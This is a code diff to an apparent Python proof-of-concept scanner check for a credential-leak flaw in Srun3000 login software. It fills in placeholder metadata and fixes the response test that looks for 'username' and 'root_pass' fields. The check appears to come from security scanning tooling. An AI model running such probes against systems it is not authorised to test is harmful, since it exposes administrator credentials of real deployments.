@@ -15,9 +15,9 @@ class Vuln(ABVuln):
         漏洞文件，
         /srun3/srun/services/modules/login/controller/login_controller.php
     '''  # 漏洞描述
-    ref = ''  # 漏洞来源
-    cnvd_id = ''  # cnvd漏洞编号
-    cve_id = ''  # cve编号
+    ref = 'Unkonwn'  # 漏洞来源
+    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
+    cve_id = 'Unkonwn'  # cve编号
     product = '深澜软件'  # 漏洞应用名称
     product_version = 'Srun3000 [3.00rc14.17.4]'  # 漏洞应用版本
 
@@ -40,7 +40,7 @@ class Poc(ABPoc):
             req = urllib2.Request(verify_url)
             content = urllib2.urlopen(req).read()
             
-            if 'username' and 'root_pass' in content:
+            if 'username' in content and 'root_pass' in content:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
@@ -48,7 +48,7 @@ class Poc(ABPoc):
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
-        super(Poc, self).exploit()
+        self.verify()
 
 if __name__ == '__main__':
     Poc().run()
